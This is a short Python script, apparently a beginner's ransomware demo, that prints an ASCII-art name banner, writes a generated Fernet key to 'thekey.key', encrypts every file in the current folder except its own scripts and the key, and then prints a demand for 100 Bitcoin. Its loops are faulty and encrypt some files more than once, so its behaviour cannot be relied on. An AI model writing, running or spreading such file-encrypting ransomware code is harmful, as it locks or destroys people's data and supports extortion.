
import os
from cryptography.fernet import Fernet
import pyfiglet
from colorama import Fore


result = pyfiglet.figlet_format("NILESH SHINDE", font = "slant" )
print(Fore.GREEN +result)

 

files = []
key = Fernet.generate_key()
print(key)
with open("thekey.key","wb") as thekey:
	thekey.write(key)
for file in os.listdir():
	if file=="encrypt.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
		for file in files:
				with open(file,"rb") as thefile:
					contents = thefile.read()	
					contents_encrypted = Fernet(key).encrypt(contents)
				with open(file,"wb") as thefile:
					thefile.write(contents_encrypted)
		
print(files)
# key = Fernet.generate_key()
# print(key)
# with open("thekey.key","wb") as thekey:
# 	thekey.write(key)



for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)

	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)
print("All of your files have been encrypted !! send me 100 Bitcoin or I'll delete them in 24 hours.")
result = pyfiglet.figlet_format("send me 100 Bitcoin ", font = "slant" )
print(Fore.GREEN +result)